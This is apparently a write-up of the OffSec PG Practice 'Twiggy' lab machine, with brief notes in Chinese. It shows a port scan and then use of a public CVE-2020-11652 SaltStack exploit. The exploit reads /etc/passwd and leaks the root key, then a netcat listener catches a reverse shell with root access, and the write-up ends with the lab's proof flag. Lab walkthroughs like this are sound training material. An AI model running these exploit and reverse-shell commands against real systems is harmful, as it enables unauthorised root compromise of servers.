###### tags: `Offsec` `PG Practice` `Easy` `Linux`

# Twiggy
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.237.62 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.237.62:22
Open 192.168.237.62:53
Open 192.168.237.62:80
Open 192.168.237.62:4506
Open 192.168.237.62:4505
Open 192.168.237.62:8000

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain  syn-ack NLnet Labs NSD
80/tcp   open  http    syn-ack nginx 1.16.1
4505/tcp open  zmtp    syn-ack ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    syn-ack ZeroMQ ZMTP 2.0
8000/tcp open  http    syn-ack nginx 1.16.1
|_http-server-header: nginx/1.16.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).
```

google `zeromq zmtp 2.0 exploit`可以找到[CVE-2020-11652](https://github.com/Al1ex/CVE-2020-11652.git)，先安裝`salt`
```
┌──(kali㉿kali)-[~/pgplay/CVE-2020-11652]
└─$ sudo pip3 install salt==3007.0rc1
```

執行看能不能拿到`/etc/passwd`確定payload可用(被下面的warning)搞好久
```
┌──(kali㉿kali)-[~/pgplay/CVE-2020-11652]
└─$ python3 CVE-2020-11652.py --master 192.168.237.62 -r /etc/passwd                          
/usr/local/lib/python3.11/dist-packages/salt/transport/client.py:27: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.237.62:4506) status... 
[+] Read root_key... root key: EhN8Uknfm4lWhieX13oN5C+NiHo63BzPifodAAOygyu3DL3ZUnCX4BEV9cvD/zT4NfCHQ22Hq7s=
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp80

┌──(kali㉿kali)-[~/pgplay/CVE-2020-11652]
└─$ python3 CVE-2020-11652.py --master 192.168.237.62 -lh 192.168.45.209 -lp 80
```

等反彈之後可以得到root權限，在/root權限可得到proof.txt
```
[root@twiggy root]# cat proof.txt
cee6d5d8eb050a861a5547170ff431e6
```